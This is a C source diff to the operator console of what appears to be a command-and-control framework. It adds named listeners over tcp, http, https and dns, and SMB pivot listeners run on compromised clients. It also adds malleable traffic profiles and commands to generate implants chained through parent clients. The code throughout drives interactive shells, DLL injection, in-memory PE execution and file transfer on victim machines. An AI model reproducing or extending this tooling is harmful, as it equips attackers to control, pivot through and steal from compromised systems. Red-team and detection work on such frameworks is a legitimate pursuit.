-    printf("  start <proto> <port>                  - Start listener (proto: tcp|http)\n");
-    printf("  stop <port>                           - Stop listener\n");
+    printf("  start <name> <proto> <port>           - Start listener\n");
+    printf("  stop <name>                           - Stop listener\n");
     printf("  list                                  - List active listeners\n");
+    printf("  listeners                             - List all active listeners\n");
     printf("  clients                               - List connected clients\n");
     printf("  send <port> <level> <id> <cmd>        - Send command\n");
     printf("  shell <port> <level> <id>             - Interactive shell\n");
     printf("  shell_dll <port> <pid> <dll> <level>  - Shell via DLL injection\n");
-    printf("  stlistener <port> <level> <id> <lport> <proto>  - Start client listener\n");
-    printf("  stop_listener <port> <level> <id> <lport>       - Stop client listener\n");
+    printf("  stlistener <port> <level> <id> <name> <lport> <proto>  - Start client listener\n");
+    printf("  stlistener <port> <level> <id> <name> smb              - Start SMB listener\n");
+    printf("  stop_listener <port> <level> <id> <name>               - Stop client listener\n");
     printf("  listlisteners <port> <level> <id>     - List client listeners\n");
     printf("  listroutes <port> <level> <id>        - List client routes\n");
     printf("  uploads <port> <level> <id> <local_file_path> <remote_file_path> - Uploads file to client\n");
     printf("  downloads <port> <level> <id> <remote_file_path> <local_file_path> - Downloads file to client\n");
     printf("  execmem <port> <level> <id> <path> [args] - Exec PE in memory\n");
-    printf("  generate <transport> <level> <ip> <port> [father_ip father_port] [beacon] - Build client\n");
+    printf("  generate <transport> <level> <ip> <port> <name_listener> - Build client\n");
+    printf("  generate smb <level> <father_ip> <father_id> <name_listener> - Build SMB client (multi-level only)\n");
+    printf("  profile_reload                        - Get current profile from %s\n", PROFILE_CONF_PATH);
+    printf("  profile                               - Show current profile from memory\n");
+    printf("  profile_init                          - Create default %s\n", PROFILE_CONF_PATH);
     printf("  exit                                  - Exit\n");
     printf("  help                                  - This help\n");
 }
@@ -2382,6 +2997,8 @@ int main(int argc, char const *argv[]) {
 
     char *input;
     char  command[2048];
+    profile_save_default(PROFILE_CONF_PATH);
+    profile_reload();
     print_help_commands();
 
     while (1) {
@@ -2397,21 +3014,33 @@ int main(int argc, char const *argv[]) {
         if (command[0] == '\0') continue;
 
         if (strncmp(command, "start", 5) == 0) {
-            char proto[32];
-            int  port;
-            if (sscanf(command, "start %31s %d", proto, &port) == 2) {
-                if (start_listen_on_port(proto, port) != 0)
+            char lname[32] = {0}, proto[32] = {0};
+            int  port = 0;
+            int sn = sscanf(command, "start %31s %31s %d", lname, proto, &port);
+            if (strcmp(proto, "smb") == 0) {
+                printf("[ERROR] SMB listeners run on clients only (use stlistener)\n");
+            } else if (sn == 3) {
+                profile_reload();
+                if (strcmp(proto, "http") == 0)
+                    http_server_set_paths(g_profile.http_path_data,
+                                          g_profile.http_path_hs);
+                else if (strcmp(proto, "https") == 0)
+                    https_server_set_paths(g_profile.http_path_data,
+                                           g_profile.http_path_hs);
+                else if (strcmp(proto, "dns") == 0)
+                    dns_server_set_domain(g_profile.dns_domain);
+                if (start_listen_on_port(lname, proto, port, &g_profile) != 0)
                     printf("Failed to start listener\n");
             } else {
-                printf("Usage: start <proto> <port>\n");
+                printf("Usage: start <name> <proto> <port>\n");
             }
-
-        } else if (strncmp(command, "stop", 4) == 0) {
-            int port;
-            if (sscanf(command, "stop %d", &port) == 1)
-                stop_listen_on_port(port);
-            else
-                printf("Usage: stop <port>\n");
+        } else if (strncmp(command, "stop ", 5) == 0 && strncmp(command, "stop_", 5) != 0) {
+            char stop_name[32];
+            if (sscanf(command, "stop %31s", stop_name) == 1) {
+                stop_listen_on_port(stop_name);
+            } else {
+                printf("Usage: stop <name>\n");
+            }
 
         } else if (strcmp(command, "list") == 0) {
             list_listeners();
@@ -2453,31 +3082,41 @@ int main(int argc, char const *argv[]) {
                 send_dll_to_client(port, pid, dll_path, level);
 
         } else if (strncmp(command, "stlistener", 10) == 0) {
-            int  port, level, listener_port;
-            char transport_type[16];
-            char id[ID_LEN];
-            if (sscanf(command,
-                        "stlistener %d %d %40s %d %15s",
-                        &port, &level, id,
-                        &listener_port, transport_type) == 5)
-                send_start_listener_to_client(port, level, id,
-                                               listener_port,
-                                               transport_type);
-            else
-                printf("Usage: stlistener <port> <level> <id> "
-                       "<lport> <proto>\n");
+            int  port, level, listener_port = 0;
+            char transport_type[16] = {0};
+            char name[32] = {0};
+            char id[ID_LEN] = {0};
+            int n = sscanf(command,
+                        "stlistener %d %d %40s %31s %d %15s",
+                        &port, &level, id, name,
+                        &listener_port, transport_type);
+            if (n == 6) {
+                send_start_listener_to_client(port, level, id, listener_port, transport_type, name);
+            } else if (n == 4 && strcmp(name, "smb") != 0) {
+                /* check if 5th token is "smb" */
+                char maybe_proto[16] = {0};
+                if (sscanf(command, "stlistener %*d %*d %*s %*s %15s", maybe_proto) == 1
+                    && strcmp(maybe_proto, "smb") == 0) {
+                    send_start_listener_to_client(port, level, id, 445, "smb", name);
+                } else {
+                    printf("Usage: stlistener <port> <level> <id> <name> <lport> <proto>\n");
+                    printf("       stlistener <port> <level> <id> <name> smb\n");
+                }
+            } else {
+                printf("Usage: stlistener <port> <level> <id> <name> <lport> <proto>\n");
+                printf("       stlistener <port> <level> <id> <name> smb\n");
+            }
 
         } else if (strncmp(command, "stop_listener", 13) == 0) {
-            int  port, level, listener_port;
-            char id[ID_LEN];
-            if (sscanf(command,
-                        "stop_listener %d %d %40s %d",
-                        &port, &level, id, &listener_port) == 4)
-                send_stop_listener_to_client(port, level, id,
-                                              listener_port);
-            else
-                printf("Usage: stop_listener <port> <level> "
-                       "<id> <lport>\n");
+            int  port, level;
+            char id[ID_LEN] = {0};
+            char name[32] = {0};
+            if (sscanf(command, "stop_listener %d %d %40s %31s",
+                        &port, &level, id, name) == 4) {
+                send_stop_listener_to_client(port, level, id, name);
+            } else {
+                printf("Usage: stop_listener <port> <level> <id> <name>\n");
+            }
 
         } else if (strncmp(command, "listlisteners", 13) == 0) {
             char client_id[ID_LEN];
@@ -2621,27 +3260,171 @@ int main(int argc, char const *argv[]) {
         } else if (strncmp(command, "generate", 8) == 0) {
             char transport[16] = {0};
             char ip[256] = {0};
-            int level = 0, port = 0, beacon = 20;
+            char father_id[ID_LEN] = {0};
+            int level = 0, port = 0;
 
-            int n = sscanf(command, "generate %15s %d %255s %d %d", transport, &level, ip, &port, &beacon);
+            char listener_name[32] = {0};
+            int n = sscanf(command, "generate %15s %d %255s %d %40s %31s",
+                           transport, &level, ip, &port, father_id, listener_name);
+            int is_smb = (strcmp(transport, "smb") == 0);
 
-            if (n < 4) {
+            if (is_smb && level <= 1) {
+                printf("[ERROR] SMB is multi-level only (level >= 2)\n");
+                printf("Usage: generate smb <level> <father_ip> <father_id>\n");
+
+            } else if (is_smb && n < 3) {
+                printf("Usage: generate smb <level> <father_ip> <father_id>\n");
+
+            } else if (is_smb) {
+                /* "generate smb 2 10.0.0.5 father_abc"
+                 *  sscanf matched 4+ tokens: ip is correct,
+                 *  but &port ate father_id — re-parse the 4th token */
+                char re_fid[ID_LEN] = {0};
+                sscanf(command, "generate %*s %*d %*s %40s %31s", re_fid, listener_name);
+                strncpy(father_id, re_fid, sizeof(father_id) - 1);
+                port = 445;
+
+                if (!father_id[0]) {
+                    printf("Usage: generate smb <level> <father_ip> <father_id> <listener_name>\n");
+                } else {
+                    profile_reload();
+                    malleable_profile_t prof = g_profile;
+                    int found_father = 0;
+                    pthread_mutex_lock(&clients_collection_mutex);
+                    for (int i = 0; i < MAX_CLIENTS; i++) {
+                        if (clients[i] && clients[i]->id &&
+                            strcmp(clients[i]->id, father_id) == 0) {
+                            RemoteListener *rl = clients[i]->remote_listeners;
+                            while (rl) {
+                                if (strcmp(rl->name, listener_name) == 0) {
+                                    prof = rl->profile;
+                                    printf("[GENERATE] using listener profile \"%s\" from %s\n",
+                                           listener_name, father_id);
+                                    found_father = 1;
+                                    break;
+                                }
+                                rl = rl->next;
+                            }
+                            if (!found_father && clients[i]->profile_received) {
+                                prof = clients[i]->profile;
+                                printf("[WARN] no listener \"%s\" for %s, fallback to 0x50 profile\n",
+                                       listener_name, father_id);
+                                found_father = 1;
+                            }
+                            break;
+                        }
+                    }
+                    pthread_mutex_unlock(&clients_collection_mutex);
+                    if (!found_father)
+                        printf("[WARN] father %s not found, using current profile\n",
+                               father_id);
+
+                    if (strcmp(transport, "dns") == 0 &&
+                        (prof.dns_domain[0] == '\0' ||
+                         strcmp(prof.dns_domain, "c2.example.com") == 0))
+                        printf("[WARN] DNS domain not set in %s\n", PROFILE_CONF_PATH);
+
+                    profile_dump(&prof);
+                    generate_client(transport, level, "0.0.0.0", 0, ip, port, listener_name, &prof);
+                }
+
+            } else if (n < 4) {
                 printf("Usage:\n");
-                printf("  L1:  generate <transport> 1 <server_ip> <server_port> [beacon]\n");
-                printf("  L2+: generate <transport> <level> <father_ip> <father_port> [beacon]\n");
+                printf("  generate <transport> <level> <ip> <port> <listener_name>\n");
+                printf("  generate <transport> <level> <father_ip> <father_port> <father_id> <listener_name>\n");
+                printf("  generate smb <level> <father_ip> <father_id> <listener_name>\n");
                 printf("Examples:\n");
                 printf("  generate https 1 192.168.1.100 8080\n");
-                printf("  generate https 2 192.168.1.50 4447\n");
-                printf("  generate tcp 3 10.0.0.75 5555 60\n");
+                printf("  generate https 2 192.168.1.50 4447 father_id\n");
+                printf("  generate smb 2 192.168.1.50 father_id\n");
+                printf("\nProfile loaded from %s (edit before generate)\n", PROFILE_CONF_PATH);
+
             } else {
-                if (n < 5) beacon = 20;
+                profile_reload();
+                malleable_profile_t prof = g_profile;
+
                 if (level == 1) {
-                    generate_client(transport, level, ip, port, "0.0.0.0", 0, beacon);
+                    ListeningSocket *found = NULL;
+                    pthread_mutex_lock(&list_mutex);
+                    ListeningSocket *ls = head_listeners;
+                    while (ls) {
+                        if (strcmp(ls->name, listener_name) == 0 && ls->active) {
+                            found = ls;
+                            break;
+                        }
+                        ls = ls->next;
+                    }
+                    pthread_mutex_unlock(&list_mutex);
+                    if (found) {
+                        prof = found->profile;
+                        printf("[GENERATE] using profile from listener \"%s\"\n", listener_name);
+                    } else
+                        printf("[WARN] no active listener \"%s\", using current profile\n",
+                               listener_name);
                 } else {
-                    generate_client(transport, level, "0.0.0.0", 0, ip, port, beacon);
+                    if (father_id[0]) {
+                        int found_father = 0;
+                        pthread_mutex_lock(&clients_collection_mutex);
+                        for (int i = 0; i < MAX_CLIENTS; i++) {
+                            if (clients[i] && clients[i]->id &&
+                                strcmp(clients[i]->id, father_id) == 0) {
+                                RemoteListener *rl = clients[i]->remote_listeners;
+                                while (rl) {
+                                    if (strcmp(rl->name, listener_name) == 0) {
+                                        prof = rl->profile;
+                                        printf("[GENERATE] using listener profile \"%s\" from %s\n",
+                                               listener_name, father_id);
+                                        found_father = 1;
+                                        break;
+                                    }
+                                    rl = rl->next;
+                                }
+                                if (!found_father && clients[i]->profile_received) {
+                                    prof = clients[i]->profile;
+                                    printf("[WARN] no listener \"%s\" for %s, fallback to 0x50 profile\n",
+                                           listener_name, father_id);
+                                    found_father = 1;
+                                }
+                                break;
+                            }
+                        }
+                        pthread_mutex_unlock(&clients_collection_mutex);
+                        if (!found_father)
+                            printf("[WARN] father %s not found, using current profile\n",
+                                   father_id);
+                    } else
+                        printf("[WARN] no father_id given for L%d, using current profile\n",
+                               level);
                 }
+
+                if (strcmp(transport, "dns") == 0 &&
+                    (prof.dns_domain[0] == '\0' ||
+                     strcmp(prof.dns_domain, "c2.example.com") == 0))
+                    printf("[WARN] DNS domain not set in %s\n", PROFILE_CONF_PATH);
+
+                profile_dump(&prof);
+
+                if (level == 1)
+                    generate_client(transport, level, ip, port, "0.0.0.0", 0, listener_name, &prof);
+                else
+                    generate_client(transport, level, "0.0.0.0", 0, ip, port, listener_name, &prof);
             }
-        } else if (strncmp(command, "exit", 4) == 0) {
+        } else if (strcmp(command, "profile_init") == 0) {
+            profile_save_default(PROFILE_CONF_PATH);
+
+        } else if (strcmp(command, "profile_reload") == 0) {
+            profile_reload();
+            if (g_profile_loaded)
+                profile_dump(&g_profile);
+
+        } else if (strcmp(command, "profile") == 0) {
+            if (g_profile_loaded)
+                profile_dump(&g_profile);
+            else
+                printf("[PROFILE] not loaded. Run 'profile init' to create it.\n");
+        } else if (strcmp(command, "listeners") == 0) {
+                registry_list_all();
+        }else if (strncmp(command, "exit", 4) == 0) {
             pthread_mutex_lock(&list_mutex);
             while (head_listeners) {
                 ListeningSocket *ls = head_listeners;
